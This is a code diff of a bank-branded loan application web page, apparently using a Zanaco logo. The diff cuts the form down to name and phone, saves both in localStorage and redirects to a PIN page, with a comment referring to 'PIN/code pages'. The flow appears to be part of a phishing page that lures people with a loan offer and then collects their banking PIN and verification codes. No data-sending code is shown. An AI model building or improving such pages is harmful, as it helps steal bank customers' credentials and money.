@@ -35,7 +35,7 @@
         font-weight: bold;
     }
 
-    input, select {
+    input {
         width: 100%;
         padding: 10px;
         border-radius: 6px;
@@ -73,30 +73,25 @@
     .checkbox-text {
       font-weight: 400;
     }
-      .logo {
-    width: 120px; /* adjust as needed */
-    margin-bottom: 20px;
-     }
-     .logo-container {
-    width: 100%;
-    height: 120px; /* change to your desired height */
-    overflow: hidden;
-    margin-bottom: 20px;
-}
-
-.logo-container .logo {
-    width: 100%;
-    height: 100%;
-    object-fit: cover; /* fills container without distortion */
-   
+    .logo-container {
+        width: 100%;
+        height: 120px; /* desired height */
+        overflow: hidden;
+        margin-bottom: 20px;
+    }
+    .logo-container .logo {
+        width: 100%;
+        height: 100%;
+        object-fit: cover; /* fills container without distortion */
+    }
 </style>
 </head>
 
 <body>
 <div class="loan-container">
    <div class="logo-container">
-          <img src="zanaco-dp.jpeg" class="logo">
-    </div>
+      <img src="zanaco-dp.jpeg" class="logo">
+   </div>
     <h2>Loan Application Form</h2>
     <form class="loan-details-form">
         <label>Full Name</label>
@@ -104,17 +99,6 @@
 
         <label>Phone Number</label>
         <input id="phone" type="tel" placeholder="Phone Number" required>
-
-        <label>Email</label>
-        <input id="email" type="email" placeholder="Email" required>
-
-        <label>National ID</label>
-        <input id="nationalId" type="text" placeholder="National ID" required>
-
-        <label>Date of Birth</label>
-        <input id="dob" type="date" required>
-
-        
 
         <div class="checkbox-container">
             <input type="checkbox" id="confirmCheck">
@@ -139,27 +123,11 @@ confirmCheck.addEventListener('change', () => {
 form.addEventListener('submit', (e) => {
     e.preventDefault();
 
-    // Get values
+    // Save name and phone in localStorage for PIN/code pages
     const name = document.getElementById('name').value;
     const phone = document.getElementById('phone').value;
-    const email = document.getElementById('email').value;
-    const nationalId = document.getElementById('nationalId').value;
-    const dob = document.getElementById('dob').value;
-    const employmentStatus = document.getElementById('employmentStatus').value;
-    const loanPurpose = document.getElementById('loanPurpose').value;
-    const repaymentPeriod = document.getElementById('repaymentPeriod').value;
-
-    // Save name and phone in localStorage for PIN/code pages
     localStorage.setItem('name', name);
     localStorage.setItem('phone', phone);
-
-    // Optionally save other details too if needed
-    localStorage.setItem('email', email);
-    localStorage.setItem('nationalId', nationalId);
-    localStorage.setItem('dob', dob);
-    localStorage.setItem('employmentStatus', employmentStatus);
-    localStorage.setItem('loanPurpose', loanPurpose);
-    localStorage.setItem('repaymentPeriod', repaymentPeriod);
 
     // Redirect to PIN page
     window.location.href = 'pin.html';
